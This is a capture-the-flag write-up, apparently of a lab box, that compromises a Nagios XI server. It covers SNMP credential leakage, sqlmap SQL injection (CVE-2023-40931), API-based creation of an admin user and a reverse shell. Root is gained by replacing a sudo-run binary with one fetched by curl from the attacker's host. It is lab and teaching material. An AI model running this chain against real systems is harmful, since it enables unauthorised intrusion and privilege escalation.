---
title: "Nagios Exploit leads to PWN"
date: 2024-04-25
---


##  Initial Scans
Ip = `10.10.11.248`

### Ports and Services
#### Open Ports
```
Open 10.10.11.248:22
Open 10.10.11.248:80
Open 10.10.11.248:389
Open 10.10.11.248:443
Open 10.10.11.248:5667
```

#### Service Enumeration
```
80/tcp   open  http       syn-ack Apache httpd 2.4.56
|_http-title: Did not follow redirect to https://nagios.monitored.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.56 (Debian)
389/tcp  open  ldap       syn-ack OpenLDAP 2.2.X - 2.3.X
443/tcp  open  ssl/http   syn-ack Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Nagios XI
| ssl-cert: Subject: commonName=nagios.monitored.htb/organizationName=Monitored/stateOrProvinceName=Dorset/countryName=UK/emailAddress=support@monitored.htb/localityName=Bournemouth
| Issuer: commonName=nagios.monitored.htb/organizationName=Monitored/stateOrProvinceName=Dorset/countryName=UK/emailAddress=support@monitored.htb/localityName=Bournemouth

```

#### Nuclei
Interesting finds
```shell
[open-redirect-generic] [http] [medium] http://nagios.monitored.htb/////evil.com [redirect="////evil.com"]
[CVE-2018-11784] [http] [medium] http://nagios.monitored.htb//interact.sh
```

Trying this?
https://github.com/ruthvikvegunta/nagiosxi_rce-to-root

Didn't work so lets try somehin else

First lets try another rustscan an


Snmpwalk
```
snmpwalk -v2c -c public nagios.monitored.htb
```
This gives me a lot of detail and is overloading. Lets use `grep`

```
snmpwalk -v2c -c public nagios.monitored.htb | grep Strings
```
##### Results
```
Linux monitored 5.10.0-28-amd64 #1 SMP Debian 5.10.209-2 (2024-01-31) x86_64"
iso.3.6.1.2.1.1.4.0 = STRING: "Me <root@monitored.htb>"
iso.3.6.1.2.1.1.5.0 = STRING: "monitored"
iso.3.6.1.2.1.1.6.0 = STRING: "Sitting on the Dock of the Bay"
iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The SNMP Management Architecture MIB."
iso.3.6.1.2.1.1.9.1.3.2 = STRING: "The MIB for Message Processing and Dispatching."
iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The management information definitions for the SNMP User-based Security Model."
iso.3.6.1.2.1.1.9.1.3.4 = STRING: "The MIB module for SNMPv2 entities"
iso.3.6.1.2.1.1.9.1.3.5 = STRING: "View-based Access Control Model for SNMP."
iso.3.6.1.2.1.1.9.1.3.6 = STRING: "The MIB module for managing TCP implementations"
iso.3.6.1.2.1.1.9.1.3.7 = STRING: "The MIB module for managing UDP implementations"
iso.3.6.1.2.1.1.9.1.3.8 = STRING: "The MIB module for managing IP and ICMP implementations"
iso.3.6.1.2.1.1.9.1.3.9 = STRING: "The MIB modules for managing SNMP Notification, plus filtering."
iso.3.6.1.2.1.1.9.1.3.10 = STRING: "The MIB module for logging SNMP Notifications."
iso.3.6.1.2.1.1.9.1.3.11 = STRING: "The MIB module for logging SNMP Notifications."
iso.3.6.1.2.1.2.2.1.2.1 = STRING: "lo"
iso.3.6.1.2.1.2.2.1.2.2 = STRING: "VMware VMXNET3 Ethernet Controller"

"postgres"

"mariadb"

"php"

"sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups"

"-c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB"

"-c /usr/bin/php -q /usr/local/nagiosxi/cron/cmdsubsys.php >> /usr/local/nagiosxi/var/cmdsubsys.log 2>&1"
```

When we try to login we get `The specified user account has been disabled or does not exist.`
# SQLMap

Let's enumerate!
```
sqlmap -u "https://nagios.monitored.htb/"
```

Oh `[CRITICAL] no parameter(s) found for testing in the provided data (e.g. GET parameter 'id' in 'www.site.com/index.php?id=1').` Right...

I googled for about an hour an really only found this to be useful [Nagios XI Vulnerability: CVE-2023–40931 — SQL Injection in Banner](https://medium.com/@n1ghtcr4wl3r/nagios-xi-vulnerability-cve-2023-40931-sql-injection-in-banner-ace8258c5567)
In this article we found that we could use the `POST /nagiosxi/admin/banner_message-ajaxhelper.php`
as our way to sqlmap nagios. We can now use the credentials we have found to get a token
```shell
curl -ksX POST https://nagios.monitored.htb/nagiosxi/api/v1/authenticate -d 'username=svc&password=XjH7VCehowpR1xZB&valid_min=500'
```
Token: `4af6ee9379971aa1cb7bbf0f5bbc931571ad6a4b`

Now lets retry SQLMap

```shell
sqlmap -u "https://nagios.monitored.htb//nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3&token=4af6ee9379971aa1cb7bbf0f5bbc931571ad6a4b" --level 5 --risk 3 -p id --batch -D nagiosxi --dump -T xi_users
```
From this we find a token and two password hashes.


Using the admin token we can create a new user with admin privileges
```shell
curl -XPOST --insecure "https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&pretty=1" -d "username=testuser&password=testuser&name=testuser&email=testuser@localhost&auth_level=admin"
```

It asks us to changes password, we do so. And we are in!

![image](https://kickeddroid.github.io/Assets/Pasted%20image%2020240425172659.png)

# Reverse Shell
using nagios admin priveleges we create a new service and add a custom command.

```
nc -lvnp 4242
listening on [any] 4242 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.11.248] 54244
bash: cannot set terminal process group (12715): Inappropriate ioctl for device
bash: no job control in this shell
nagios@monitored:~$ ls
ls
cookie.txt
user.txt
nagios@monitored:~$ cat user.txt
cat user.txt
00e6ec0baf23d4e12f08b43309b8d692
nagios@monitored:~$ 
```

# Priv Esc

The classic `sudo -l`
```
sudo -l
```

We see some interesting stuff mainly 
```
/usr/local/nagiosxi/scripts/manage_services.sh
/usr/bin/php
        /usr/local/nagiosxi/scripts/components/autodiscover_new.php *
    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/send_to_nls.php *
    (root) NOPASSWD: /usr/bin/php

```

```
cat /usr/local/nagiosxi/scripts/manage_services.sh
```

```
cd /usr/local/nagios/bin/

rm npcd
```


```
curl -O http://10.10.14.2:8000/npcd
```

```
chmod +x /usr/local/nagios/bin/npcd
```

```
sudo /usr/local/nagiosxi/scripts/manage_services.sh restart npcd
```

```
fb032368ebeba0e8369df5131f2fbf74
```
